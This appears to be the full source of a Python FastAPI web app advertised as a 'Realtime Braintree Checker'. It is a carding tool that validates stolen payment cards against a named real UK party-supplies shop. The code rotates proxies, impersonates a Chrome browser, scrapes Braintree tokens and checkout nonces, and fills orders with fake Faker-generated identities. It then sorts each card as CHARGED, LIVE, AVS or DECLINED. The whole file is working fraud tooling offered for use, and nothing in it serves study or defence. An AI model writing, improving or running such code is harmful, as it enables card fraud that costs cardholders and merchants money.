# app.py
from __future__ import annotations

import asyncio
import base64
import json
import random
import re
import uuid
import time
from concurrent.futures import ThreadPoolExecutor
from pathlib import Path
from fastapi import FastAPI, Form, Request
from fastapi.responses import HTMLResponse, StreamingResponse
import requests
import urllib3
from curl_cffi import requests as cffi
from faker import Faker

urllib3.disable_warnings()

app = FastAPI(title="Ollie Realtime Braintree Checker - Fully Optimized")

HOST = "https://www.partyrama.co.uk"
UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
BT_VERSION = "2018-05-10"
BT_MERCHANT = "h9rc962wyvrr97jn"
BT_GRAPHQL = "https://payments.braintree-api.com/graphql"
BT_3DS_BASE = f"https://api.braintreegateway.com/merchants/{BT_MERCHANT}/client_api/v1/payment_methods"
PRODUCT_URL = HOST + "/?add-to-cart=1389245"
CHECKOUT_URL = HOST + "/checkout/"
AJAX_TOKEN_URL = HOST + "/?wc-ajax=wc_braintree_frontend_request&path=/wc-braintree/v1/client-token/create"
PROXY_CHECK_URL = "https://api.ipify.org?format=json"

fake = Faker("en_GB")
Faker.seed()

TOKENIZE_QUERY = (
    "mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {"
    "  tokenizeCreditCard(input: $input) {"
    "    token creditCard { bin brandCode last4 cardholderName expirationMonth expirationYear"
    "      binData { prepaid healthcare debit durbinRegulated commercial payroll"
    "        issuingBank countryOfIssuance productId business consumer purchase corporate }"
    "    }"
    "  }"
    "}"
)

def gen_identity():
    first = fake.first_name()
    last = fake.last_name()
    postcode = fake.postcode()
    phone = "+44" + str(random.randint(7000000000, 7999999999))
    email = f"{first.lower()}.{last.lower()}{random.randint(1, 99999)}@yopmail.com"
    return {
        "first_name": first, "last_name": last, "company": "Partyrama Customer",
        "country": "GB", "address_1": fake.street_address(), "address_2": "",
        "city": "London", "state": "Greater London",
        "postcode": postcode, "phone": phone, "email": email,
    }

class ProxyPool:
    def __init__(self, proxies):
        self.proxies = [p.strip() for p in proxies if p.strip()]
        self.i = 0

    def next_dict(self):
        if not self.proxies: return None
        p = self.proxies[self.i % len(self.proxies)]
        self.i += 1
        if "://" in p: return {"http": p, "https": p}
        parts = p.split(":")
        if len(parts) == 4:
            h, po, u, pw = parts
            fmt = f"http://{u}:{pw}@{h}:{po}"
            return {"http": fmt, "https": fmt}
        return {"http": f"http://{p}", "https": f"http://{p}"}

def verify_proxy(p):
    formatted = {"http": p, "https": p} if "://" in p else {"http": f"http://{p}", "https": f"http://{p}"}
    try:
        start_t = time.perf_counter()
        r = requests.get(PROXY_CHECK_URL, proxies=formatted, timeout=8, verify=False)
        latency = round((time.perf_counter() - start_t) * 1000, 2)
        if r.status_code == 200:
            ip_val = r.json().get("ip", "OK")
            return {"status": "LIVE", "proxy": p, "ip": ip_val, "latency": latency}
    except Exception:
        pass
    return {"status": "DEAD", "proxy": p}

@app.post("/api/check-proxies")
async def api_check_proxies(proxies: str = Form(...), proxy_threads: int = Form(20)):
    raw_proxies = [line.strip() for line in proxies.splitlines() if line.strip()]
    alive_proxies = []

    async def event_generator():
        with ThreadPoolExecutor(max_workers=max(1, proxy_threads)) as ex:
            loop = asyncio.get_running_loop()
            futures = [loop.run_in_executor(ex, verify_proxy, p) for p in raw_proxies]
            
            for coro in asyncio.as_completed(futures):
                res = await coro
                if res["status"] == "LIVE":
                    alive_proxies.append(res["proxy"])
                yield f"data: {json.dumps(res)}\n\n"
        
        yield f"data: {json.dumps({'status': 'DONE', 'alive_list': alive_proxies})}\n\n"

    return StreamingResponse(event_generator(), media_type="text/event-stream")

def extract_fingerprint(html):
    match = re.search(r'id=["\']braintree_cc_config_data["\'][^>]+value=["\'](.*?)["\'](?:\s+|>)', html, re.DOTALL)
    if match:
        try:
            raw_json = match.group(1).replace("&quot;", '"')
            cfg = json.loads(raw_json)
            fp = cfg.get("androidPay", {}).get("googleAuthorizationFingerprint")
            if fp: return fp
        except Exception: pass
    match_js = re.search(r'var\s+wc_braintree_client_token\s*=\s*\[\s*["\']([^"\']+)["\']\s*\]', html)
    if match_js:
        try:
            b64_token = match_js.group(1) + "=" * (-len(match_js.group(1)) % 4)
            token_data = json.loads(base64.b64decode(b64_token).decode("utf-8", errors="ignore"))
            fp = token_data.get("authorizationFingerprint")
            if fp: return fp
        except Exception: pass
    return None

def extract_cart_key(html):
    m = re.search(r'name=["\']cart\[([a-f0-9]{20,})\]\[qty\]', html)
    if m: return m.group(1)
    m = re.search(r'data-cart_item_key=["\']([a-f0-9]{20,})["\']', html)
    return m.group(1) if m else "partyrama_cart_item"

def extract_shipping(html):
    m = re.search(r'name=["\']shipping_method\[0\]["\'][^>]*?\bvalue=["\']([^"\']+)["\']', html, re.I)
    return m.group(1) if m else "flat_rate:1"

def extract_checkout_nonce(html):
    for p in (
        r'(?:name|id)=["\']woocommerce-process-checkout-nonce["\'][^>]*?\bvalue=["\']([^"\']+)["\']',
        r'\bvalue=["\']([^"\']+)["\'][^>]*?\b(?:name|id)=["\']woocommerce-process-checkout-nonce["\']',
    ):
        m = re.search(p, html, re.I)
        if m: return m.group(1)
    return "dummy_nonce_fix"

def extract_config_json(html):
    import html as htmllib
    m = re.search(r'name=["\']braintree_cc_config_data["\'][^>]*?\bvalue=["\']([^"\']*)["\']', html, re.I)
    if m:
        v = htmllib.unescape(m.group(1))
        if v and len(v) > 50: return v
    return None

def extract_total(html):
    m = re.search(r'class=["\'][^"\']*order-total[^"\']*["\'][^>]*>(.*?)</tr>', html, re.S | re.I)
    if m:
        m2 = re.search(r'[£$€]\s*([\d.,]+)', m.group(1))
        if m2: return m2.group(1).replace(",", "")
    return "4.35"

def extract_reason(msgs):
    if isinstance(msgs, str):
        clean = re.sub(r"<[^>]+>", " ", msgs)
        clean = re.sub(r"\s+", " ", clean).strip()
        if len(clean) > 80: clean = clean[:77] + "..."
        return clean
    return "No reason provided"

def classify(reason, wc_result):
    if wc_result == "success": return "CHARGED"
    if not reason: return "DECLINED"
    m = reason.lower()
    if any(k in m for k in ("avs", "address verification", "address does not match")): return "AVS"
    if any(k in m for k in ("insufficient", "cvv", "cvc", "security code")): return "LIVE"
    return "DECLINED"

def run_single_card(card_line, pool):
    parts = [p.strip() for p in re.split(r"[|:/\\\s-]+", card_line) if p.strip()]
    if len(parts) < 4: return {"card": card_line, "status": "INVALID", "reason": "Invalid Format"}
    cc, mm, yy, cvv = parts[0], parts[1].zfill(2), parts[2], parts[3]
    yy = yy if len(yy) == 4 else "20" + yy[-2:]
    masked = f"{cc[:6]}******{cc[-4:]}|{mm}|{yy}|{cvv}"

    ident = gen_identity()
    session_id = str(uuid.uuid4())
    
    for attempt in range(2):
        try:
            sess = cffi.Session(impersonate="chrome124", timeout=35)
            sess.trust_env = False
            prox = pool.next_dict()

            r_home = sess.get(HOST + "/", proxies=prox, timeout=12)
            if r_home.status_code >= 400:
                continue

            sess.get(PRODUCT_URL, proxies=prox, timeout=12)
            co = sess.get(CHECKOUT_URL, proxies=prox, timeout=15, allow_redirects=True)
            html = co.text

            fingerprint = extract_fingerprint(html)
            if not fingerprint:
                try:
                    ajax_resp = sess.get(AJAX_TOKEN_URL, proxies=prox, timeout=8)
                    if ajax_resp.status_code == 200:
                        fingerprint = ajax_resp.json().get("authorizationFingerprint")
                except Exception:
                    pass

            if not fingerprint:
                return {"card": masked, "status": "DEAD", "reason": "No fingerprint found"}

            cart_key = extract_cart_key(html)
            shipping = extract_shipping(html)
            wc_nonce = extract_checkout_nonce(html)
            config_data = extract_config_json(html)
            total = extract_total(html)

            tp = {
                "clientSdkMetadata": {"source": "client", "integration": "dropin2", "sessionId": session_id},
                "query": TOKENIZE_QUERY,
                "variables": {"input": {"creditCard": {"number": cc, "expirationMonth": mm, "expirationYear": yy, "cvv": cvv}, "options": {"validate": False}}},
                "operationName": "TokenizeCreditCard",
            }
            
            try:
                bt = sess.post(BT_GRAPHQL, json=tp, proxies=prox, headers={
                    "authorization": "Bearer " + fingerprint,
                    "braintree-version": BT_VERSION,
                    "content-type": "application/json",
                    "origin": "https://assets.braintreegateway.com",
                    "referer": "https://assets.braintreegateway.com/",
                    "user-agent": UA,
                }, timeout=15, verify=False)
            except Exception:
                return {"card": masked, "status": "ERROR", "reason": "Gateway Connection Failed (Proxy/Cloud Block)"}
            
            try:
                bj = bt.json()
            except Exception:
                return {"card": masked, "status": "DECLINED", "reason": "Gateway Blocked Response (Cloudflare)"}

            nonce_token = (bj.get("data") or {}).get("tokenizeCreditCard", {}).get("token")
            if not nonce_token:
                err = bj.get("errors") or "no token"
                return {"card": masked, "status": "DECLINED", "reason": extract_reason(str(err))}

            wc_body = {
                "billing_first_name": ident["first_name"], "billing_last_name": ident["last_name"],
                "billing_country": ident["country"], "billing_address_1": ident["address_1"],
                "billing_city": ident["city"], "billing_state": ident["state"],
                "billing_postcode": ident["postcode"], "billing_phone": ident["phone"],
                "billing_email": ident["email"], "shipping_method[0]": shipping,
                "payment_method": "braintree_cc", "braintree_cc_nonce_key": nonce_token,
                "braintree_cc_config_data": config_data or "", "terms": "on",
                "woocommerce-process-checkout-nonce": wc_nonce,
            }

            rr = sess.post(HOST + "/?wc-ajax=checkout", data=wc_body, proxies=prox, timeout=15)
            jj = rr.json()
            wc_result = str(jj.get("result", "")).lower()
            if wc_result == "success":
                return {"card": masked, "status": "CHARGED", "reason": "Order Successful"}
            
            reason = extract_reason(jj.get("messages") or "")
            status = classify(reason, wc_result)
            return {"card": masked, "status": status, "reason": reason}

        except Exception as e:
            if attempt == 1:
                return {"card": masked, "status": "ERROR", "reason": str(e)[:50]}
            time.sleep(0.3)

    return {"card": masked, "status": "ERROR", "reason": "Connection Failed"}

@app.get("/", response_class=HTMLResponse)
async def index():
    return """<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>Ollie Realtime Checker - Fully Optimized</title>
    <script src="https://cdn.tailwindcss.com"></script>
</head>
<body class="bg-slate-950 text-white min-h-screen p-6 font-mono">
    <main class="max-w-4xl mx-auto space-y-6">
        <div class="border-b border-slate-800 pb-4 flex justify-between items-center">
            <div>
                <h1 class="text-2xl font-bold text-emerald-400">Partyrama Realtime Checker</h1>
                <p class="text-xs text-slate-400">Bypass Cloud/Proxy Block + Realtime Streaming</p>
            </div>
            <div class="text-xs text-slate-400">
                Live Cards: <span id="liveCount" class="text-emerald-400 font-bold">0</span> | 
                Dead Cards: <span id="deadCount" class="text-rose-400 font-bold">0</span>
            </div>
        </div>

        <div class="bg-slate-900 rounded-xl p-5 space-y-4 shadow-xl border border-slate-800">
            <div class="grid grid-cols-2 gap-4">
                <div>
                    <label class="block text-xs text-slate-400 mb-1">Proxy Threads</label>
                    <input id="proxyThreads" type="number" value="20" class="w-full bg-slate-950 border border-slate-700 rounded p-2 text-xs text-emerald-300 text-center">
                </div>
                <div>
                    <label class="block text-xs text-slate-400 mb-1">Card Threads</label>
                    <input id="cardThreads" type="number" value="5" class="w-full bg-slate-950 border border-slate-700 rounded p-2 text-xs text-emerald-300 text-center">
                </div>
            </div>

            <div>
                <div class="flex justify-between items-center mb-1">
                    <label class="text-xs text-slate-400">Proxy List</label>
                    <button onclick="startProxyCheck()" id="proxyBtn" class="bg-blue-600 hover:bg-blue-500 px-3 py-1 rounded text-xs font-bold transition">
                        Test & Auto-Prune Proxies
                    </button>
                </div>
                <textarea id="proxyInput" rows="3" placeholder="http://user:pass@host:port" class="w-full bg-slate-950 border border-slate-700 rounded p-3 text-xs text-emerald-300 focus:outline-none"></textarea>
                <div id="proxyStats" class="text-[11px] text-slate-400 mt-1">Live Proxies: <span id="pLive" class="text-emerald-400">0</span> | Dead: <span id="pDead" class="text-rose-400">0</span></div>
            </div>

            <div>
                <label class="block text-xs text-slate-400 mb-1">Cards List (CC|MM|YY|CVV)</label>
                <textarea id="cardInput" rows="4" placeholder="548809...|04|27|913" class="w-full bg-slate-950 border border-slate-700 rounded p-3 text-xs text-emerald-300 focus:outline-none"></textarea>
            </div>

            <button onclick="startRealtimeCheck()" id="checkBtn" class="bg-emerald-600 hover:bg-emerald-500 w-full py-3 rounded font-bold text-sm transition">
                Simulan ang Realtime Card Check
            </button>
        </div>

        <div class="grid grid-cols-1 md:grid-cols-2 gap-4">
            <div class="bg-slate-900 border border-slate-800 rounded-xl p-4">
                <h2 class="text-xs font-bold text-emerald-400 uppercase mb-3">Live / Approved Cards</h2>
                <div id="liveBox" class="space-y-2 max-h-80 overflow-y-auto text-xs"></div>
            </div>
            <div class="bg-slate-900 border border-slate-800 rounded-xl p-4">
                <h2 class="text-xs font-bold text-rose-400 uppercase mb-3">Dead / Declined / Proxy Logs</h2>
                <div id="deadBox" class="space-y-2 max-h-80 overflow-y-auto text-xs"></div>
            </div>
        </div>
    </main>

    <script>
    let liveCount = 0;
    let deadCount = 0;
    let pLiveCount = 0;
    let pDeadCount = 0;

    async function startProxyCheck() {
        const proxies = document.getElementById("proxyInput").value.trim();
        const proxyThreads = document.getElementById("proxyThreads").value;
        const btn = document.getElementById("proxyBtn");
        const deadBox = document.getElementById("deadBox");

        if (!proxies) return alert("Maglagay muna ng mga proxy.");

        btn.disabled = true;
        btn.textContent = "Sine-sensus ang Proxies...";
        pLiveCount = 0; pDeadCount = 0;
        document.getElementById("pLive").textContent = "0";
        document.getElementById("pDead").textContent = "0";
        deadBox.innerHTML = "";

        let aliveList = [];

        try {
            const response = await fetch("/api/check-proxies", {
                method: "POST",
                headers: { "Content-Type": "application/x-www-form-urlencoded" },
                body: new URLSearchParams({ proxies, proxy_threads: proxyThreads })
            });

            const reader = response.body.getReader();
            const decoder = new TextDecoder();

            while (true) {
                const { value, done } = await reader.read();
                if (done) break;

                const chunk = decoder.decode(value, { stream: true });
                const lines = chunk.split("\\n\\n");
                for (const line of lines) {
                    if (line.startsWith("data:")) {
                        try {
                            const data = JSON.parse(line.replace("data:", "").trim());
                            if (data.status === "DONE") {
                                aliveList = data.alive_list;
                                document.getElementById("proxyInput").value = aliveList.join("\\n");
                            } else {
                                appendProxyResult(data);
                            }
                        } catch (e) {}
                    }
                }
            }
        } catch (err) {
            alert("Error sa pag-check ng proxy: " + err.message);
        }

        btn.disabled = false;
        btn.textContent = "Test & Auto-Prune Proxies";
    }

    function appendProxyResult(r) {
        const isLive = r.status === 'LIVE';
        const deadBox = document.getElementById("deadBox");

        if (isLive) {
            pLiveCount++;
            document.getElementById("pLive").textContent = pLiveCount;
        } else {
            pDeadCount++;
            document.getElementById("pDead").textContent = pDeadCount;
        }

        const badgeColor = isLive ? 'bg-emerald-500 text-black' : 'bg-rose-500 text-white';
        const item = document.createElement("div");
        item.className = "bg-slate-950 border border-slate-800 p-2 rounded flex justify-between items-center";
        item.innerHTML = `
            <div>
                <span class="px-1.5 py-0.5 rounded font-bold text-[10px] ${badgeColor}">${r.status}</span>
                <span class="text-sky-300 ml-2">${r.proxy}</span>
            </div>
            <span class="text-slate-400 text-[11px]">${isLive ? 'IP: ' + r.ip + ' (' + r.latency + 'ms)' : 'Dead / Timeout'}</span>
        `;
        deadBox.prepend(item);
    }

    async function startRealtimeCheck() {
        const cards = document.getElementById("cardInput").value.trim();
        const proxies = document.getElementById("proxyInput").value.trim();
        const cardThreads = document.getElementById("cardThreads").value;
        const btn = document.getElementById("checkBtn");

        if (!cards) return alert("Maglagay muna ng mga kard.");

        btn.disabled = true;
        btn.textContent = "Nagsusuri ng mga Kard (Realtime)...";
        document.getElementById("liveBox").innerHTML = "";
        liveCount = 0; deadCount = 0;
        document.getElementById("liveCount").textContent = "0";
        document.getElementById("deadCount").textContent = "0";

        try {
            const response = await fetch("/api/stream-check", {
                method: "POST",
                headers: { "Content-Type": "application/x-www-form-urlencoded" },
                body: new URLSearchParams({ cards, proxies, proxy_threads: 20, card_threads: cardThreads })
            });

            const reader = response.body.getReader();
            const decoder = new TextDecoder();

            while (true) {
                const { value, done } = await reader.read();
                if (done) break;

                const chunk = decoder.decode(value, { stream: true });
                const lines = chunk.split("\\n\\n");
                for (const line of lines) {
                    if (line.startsWith("data:")) {
                        try {
                            const data = JSON.parse(line.replace("data:", "").trim());
                            appendCardResult(data);
                        } catch (e) {}
                    }
                }
            }
        } catch (err) {
            alert("Nagkaroon ng error sa koneksyon: " + err.message);
        }

        btn.disabled = false;
        btn.textContent = "Simulan ang Realtime Card Check";
    }

    function appendCardResult(r) {
        const isLive = r.status === 'CHARGED' || r.status === 'AVS' || r.status === 'LIVE' || r.status === '3DS';
        const box = isLive ? document.getElementById("liveBox") : document.getElementById("deadBox");
        
        if (isLive) {
            liveCount++;
            document.getElementById("liveCount").textContent = liveCount;
        } else {
            deadCount++;
            document.getElementById("deadCount").textContent = deadCount;
        }

        const badgeColor = isLive ? 'bg-emerald-500 text-black' : 'bg-rose-500 text-white';
        const item = document.createElement("div");
        item.className = "bg-slate-950 border border-slate-800 p-2.5 rounded flex justify-between items-center";
        item.innerHTML = `
            <div>
                <span class="px-1.5 py-0.5 rounded font-bold text-[10px] ${badgeColor}">${r.status}</span>
                <span class="text-sky-400 ml-2">${r.card}</span>
            </div>
            <span class="text-slate-400 text-[11px]">${r.reason}</span>
        `;
        box.prepend(item);
    }
    </script>
</body>
</html>"""

@app.post("/api/stream-check")
async def stream_check(
    cards: str = Form(...),
    proxies: str = Form(""),
    proxy_threads: int = Form(20),
    card_threads: int = Form(5)
):
    card_list = [line.strip() for line in cards.splitlines() if line.strip()]
    raw_proxies = [line.strip() for line in proxies.splitlines() if line.strip()]

    pool = ProxyPool(raw_proxies)

    async def event_generator():
        with ThreadPoolExecutor(max_workers=max(1, card_threads)) as ex:
            loop = asyncio.get_running_loop()
            futures = [loop.run_in_executor(ex, run_single_card, card, pool) for card in card_list]
            
            for coro in asyncio.as_completed(futures):
                res = await coro
                yield f"data: {json.dumps(res)}\n\n"

    return StreamingResponse(event_generator(), media_type="text/event-stream")
